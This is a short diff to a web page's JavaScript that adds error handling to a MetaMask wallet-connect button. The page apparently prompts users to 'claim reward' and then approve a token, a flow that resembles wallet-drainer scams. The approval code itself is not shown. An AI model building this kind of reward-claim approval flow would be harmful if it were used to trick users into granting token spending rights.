@@ -29,16 +29,22 @@
     let provider, signer, token;
 
     document.getElementById("connectBtn").onclick = async () => {
-      if (window.ethereum) {
-        provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        signer = await provider.getSigner();
-        token = new ethers.Contract(tokenAddress, ABI, signer);
-        document.getElementById("status").innerText = "✅ Wallet connected! Ready to claim reward.";
-      } else {
-        alert("Please install MetaMask to use this site.");
-      }
-    };
+  if (window.ethereum) {
+    try {
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      token = new ethers.Contract(tokenAddress, ABI, signer);
+      document.getElementById("status").innerText = "✅ Wallet connected! Ready to claim reward.";
+    } catch (err) {
+      console.error("Connection error:", err);
+      document.getElementById("status").innerText = "❌ Failed to connect wallet.";
+    }
+  } else {
+    alert("Please install MetaMask to use this site.");
+  }
+};
+
 
     document.getElementById("approveBtn").onclick = async () => {
       if (!signer) return alert("Connect your wallet first.");
